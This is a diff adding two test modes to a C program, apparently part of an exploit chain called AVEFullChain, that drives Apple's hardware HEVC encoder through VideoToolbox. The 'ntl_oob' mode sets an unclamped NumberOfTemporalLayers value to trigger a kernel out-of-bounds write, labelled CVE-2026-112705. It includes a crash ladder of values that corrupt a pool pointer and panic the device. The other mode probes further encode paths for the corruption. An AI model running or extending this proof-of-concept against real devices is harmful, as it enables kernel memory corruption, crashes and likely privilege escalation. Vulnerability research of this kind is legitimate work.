@@ -10988,6 +10988,220 @@ vps_cd_done:
         rlog("AID=89 (0x59) matched the Nov 20 FAR value.\n");
         rlog("\n=== PANIC_TRIGGER complete ===\n");
 
+    } else if (strcmp(mode, "oob_multi_encode") == 0) {
+        /*
+         * oob_multi_encode — Test if multi-frame encoding triggers crash from OOB
+         *
+         * oob_crash_scan only does 1 encode per AID — if the corrupted pointer
+         * is used only during temporal prediction (2nd+ frame), B-frame refs,
+         * or rate control adaptation, the first encode won't trigger it.
+         *
+         * This mode: create session with given AID, then encode MANY frames
+         * with varied content. If a crash happens, the encode count tells us
+         * which code path accesses the corrupted field.
+         */
+        int aid = (argc > 2) ? atoi(argv[2]) : 89;
+        int num_encodes = (argc > 3) ? atoi(argv[3]) : 50;
+        int vw = (argc > 4) ? atoi(argv[4]) : 192;
+        int vh = (argc > 5) ? atoi(argv[5]) : 192;
+        if (aid < 2) aid = 89;
+        if (num_encodes < 1) num_encodes = 50;
+        if (num_encodes > 500) num_encodes = 500;
+
+        rlog("=== OOB_MULTI_ENCODE: AID=%d, encodes=%d, res=%dx%d ===\n",
+             aid, num_encodes, vw, vh);
+        rlog("Theory: corrupted ptr used only during multi-frame encoding paths\n\n");
+
+        #ifndef CREATE_ALPHA_SESSION
+        #define CREATE_ALPHA_SESSION(w_, h_, aid_val, out_s) do { \
+            VTCompressionSessionRef s_ = NULL; \
+            CFMutableDictionaryRef es_ = CFDictionaryCreateMutable(NULL, 0, \
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks); \
+            CFDictionarySetValue(es_, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue); \
+            CFDictionarySetValue(es_, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue); \
+            OSStatus cs_ = VTCompressionSessionCreate(NULL, w_, h_, \
+                kCMVideoCodecType_HEVC, es_, NULL, NULL, encode_cb, NULL, &s_); \
+            CFRelease(es_); \
+            if (cs_ == noErr && s_) { \
+                VTSessionSetProperty(s_, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue); \
+                VTSessionSetProperty(s_, CFSTR("EncodesAlpha"), kCFBooleanTrue); \
+                int av_ = (aid_val); \
+                CFNumberRef an_ = CFNumberCreate(NULL, kCFNumberIntType, &av_); \
+                VTSessionSetProperty(s_, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), an_); \
+                CFRelease(an_); \
+                cs_ = VTCompressionSessionPrepareToEncodeFrames(s_); \
+                if (cs_ != noErr) { VTCompressionSessionInvalidate(s_); CFRelease(s_); s_ = NULL; } \
+            } else { s_ = NULL; } \
+            (out_s) = s_; \
+        } while(0)
+        #endif
+
+        VTCompressionSessionRef s = NULL;
+        CREATE_ALPHA_SESSION(vw, vh, aid, s);
+        if (!s) { rlog("FAIL: could not create session\n"); goto done; }
+        rlog("Session created, AID=%d set.\n", aid);
+
+        /* Enable temporal prediction features that might use the corrupted fields */
+        int max_kf = 30;
+        CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &max_kf);
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
+        CFRelease(kfn);
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
+        int bframes = 2;
+        CFNumberRef bfn = CFNumberCreate(NULL, kCFNumberIntType, &bframes);
+        VTSessionSetProperty(s, CFSTR("MaxBFrames"), bfn);
+        CFRelease(bfn);
+        rlog("Temporal compression ON, MaxBFrames=2, MaxKeyFrameInterval=30\n");
+
+        int encode_ok = 0, encode_fail = 0;
+        for (int e = 0; e < num_encodes; e++) {
+            g_encode_done = 0; g_cb_status = -999;
+            CVPixelBufferRef pb = NULL;
+            CVPixelBufferCreate(NULL, vw, vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+            if (!pb) { encode_fail++; continue; }
+            CVPixelBufferLockBaseAddress(pb, 0);
+            void *base = CVPixelBufferGetBaseAddress(pb);
+            if (base) {
+                /* Vary frame content to trigger different encoding paths */
+                uint8_t fill = (uint8_t)((e * 37 + 17) & 0xFF);
+                memset(base, fill, CVPixelBufferGetDataSize(pb));
+                /* Add some structure to help trigger motion estimation */
+                size_t stride = CVPixelBufferGetBytesPerRow(pb);
+                for (int y = 0; y < vh; y += 4)
+                    for (int x = 0; x < vw * 4; x += 16)
+                        if (x < (int)stride)
+                            ((uint8_t*)base)[y * stride + x] = (uint8_t)(e + y + x);
+            }
+            CVPixelBufferUnlockBaseAddress(pb, 0);
+
+            CMTime pts = CMTimeMake(e, 30);
+            OSStatus est = VTCompressionSessionEncodeFrame(s, pb, pts,
+                kCMTimeInvalid, NULL, NULL, NULL);
+            if (est != noErr) {
+                rlog("  Encode %d FAILED: %d\n", e, (int)est);
+                CVPixelBufferRelease(pb);
+                encode_fail++;
+                continue;
+            }
+            VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+            for (int w = 0; w < 50 && !g_encode_done; w++) usleep(5000);
+            CVPixelBufferRelease(pb);
+            encode_ok++;
+
+            if (e < 5 || (e % 10 == 0))
+                rlog("  Encode %d: cb=%d nal=%zu\n", e, (int)g_cb_status, g_last_nal_size);
+        }
+
+        rlog("\nEncoded %d/%d frames (fail=%d)\n", encode_ok, num_encodes, encode_fail);
+        rlog("If no crash: corrupted field not in this encoding path.\n");
+        rlog("Try: different AID (64-255), larger resolution, B-frame encoding.\n");
+
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+
+        rlog("\n=== OOB_MULTI_ENCODE complete ===\n");
+
+    } else if (strcmp(mode, "ntl_oob") == 0) {
+        /*
+         * ntl_oob — CVE-2026-112705: NumberOfTemporalLayers OOB write
+         *
+         * The REAL vulnerability behind the Nov 20 panic.
+         * AVE_PSGen::Init has 3 write loops bounded by NTL value (unclamped on iOS 27.1).
+         * Loop 1 at pClient+0x4678 writes using count = NTL-1 (from VPS+8).
+         *
+         * Crash ladder (from panicIDK analysis):
+         *   NTL ≤ 16462: writes within struct (clean)
+         *   NTL = 16463: 1 slot before pcaSurfacePool[0] (clean)
+         *   NTL = 16464: pool[0] LOW half → FAR=0x59 (partial ptr corruption)
+         *   NTL ≥ 16465: pool[0] full u64 → FAR=0x100000059
+         *
+         * Write value w24 = min(CalcRefNum(), max(HEVC_CalcMaxDpbSize(w,h,tier,level),1)-1)
+         *   At 192x192: w24 = 1 or 9
+         *
+         * Panic happens at session TEARDOWN when corrupted pool[0] is dereferenced.
+         *
+         * iOS 27.2 fix: NTL > 7 → returns -2004 (the check is in VTSessionSetProperty)
+         * iOS 27.1: NO CHECK — NTL passed directly to kernel
+         */
+        int ntl = (argc > 2) ? atoi(argv[2]) : 16463;
+        int do_encode = (argc > 3) ? atoi(argv[3]) : 1;
+        int vw = 192, vh = 192;
+
+        rlog("=== NTL_OOB: CVE-2026-112705 NumberOfTemporalLayers OOB ===\n");
+        rlog("NTL=%d, encode=%d, res=%dx%d\n", ntl, do_encode, vw, vh);
+        rlog("Crash ladder: 16462=safe, 16463=edge, 16464=panic(FAR=0x59), 16465+=full\n\n");
+
+        if (ntl >= 16464) {
+            rlog("*** WARNING: NTL=%d WILL LIKELY CAUSE KERNEL PANIC ***\n", ntl);
+            rlog("*** Device will REBOOT if the write hits pcaSurfacePool[0] ***\n\n");
+        }
+
+        VTCompressionSessionRef s = NULL;
+        CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+        CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+        OSStatus cs = VTCompressionSessionCreate(NULL, vw, vh,
+            kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+        CFRelease(es);
+        rlog("Create: %d, session=%p\n", (int)cs, (void*)s);
+        if (cs != noErr || !s) { rlog("FAIL\n"); goto done; }
+
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+
+        /* Set NumberOfTemporalLayers — on iOS 27.1 this is NOT clamped */
+        CFNumberRef ntl_num = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+        OSStatus sp = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), ntl_num);
+        CFRelease(ntl_num);
+        rlog("SetProperty(NumberOfTemporalLayers=%d): %d\n", ntl, (int)sp);
+
+        if (sp != noErr) {
+            rlog("Property REJECTED — may be clamped in userspace.\n");
+            rlog("If sp=-2004: iOS 27.2+ fix is active (NTL>7 blocked)\n");
+            VTCompressionSessionInvalidate(s); CFRelease(s);
+            goto done;
+        }
+
+        /* PrepareToEncodeFrames — this sends NTL to kernel, triggers AVE_PSGen::Init
+           which runs the 3 write loops with count=NTL-1 */
+        rlog("Calling PrepareToEncodeFrames (triggers kernel OOB write)...\n");
+        OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
+        rlog("PrepareToEncodeFrames: %d\n", (int)prep);
+
+        if (prep != noErr) {
+            rlog("Prepare FAILED: kernel may have rejected high NTL\n");
+            VTCompressionSessionInvalidate(s); CFRelease(s);
+            goto done;
+        }
+        rlog("Prepare succeeded — kernel accepted NTL=%d\n", ntl);
+
+        if (do_encode) {
+            rlog("Encoding one frame...\n");
+            g_encode_done = 0; g_cb_status = -999;
+            CVPixelBufferRef pb = NULL;
+            CVPixelBufferCreate(NULL, vw, vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+            if (pb) {
+                CVPixelBufferLockBaseAddress(pb, 0);
+                void *base = CVPixelBufferGetBaseAddress(pb);
+                if (base) memset(base, 0x42, CVPixelBufferGetDataSize(pb));
+                CVPixelBufferUnlockBaseAddress(pb, 0);
+                VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0,30),
+                    kCMTimeInvalid, NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+                for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
+                rlog("Encode: cb_status=%d, nal_size=%zu\n", (int)g_cb_status, g_last_nal_size);
+                CVPixelBufferRelease(pb);
+            }
+        }
+
+        rlog("Session teardown (Invalidate + Release)...\n");
+        rlog("If NTL>=16464: panic expected HERE during pool cleanup\n");
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+        rlog("Teardown complete — no panic at NTL=%d\n", ntl);
+
+        rlog("\n=== NTL_OOB complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
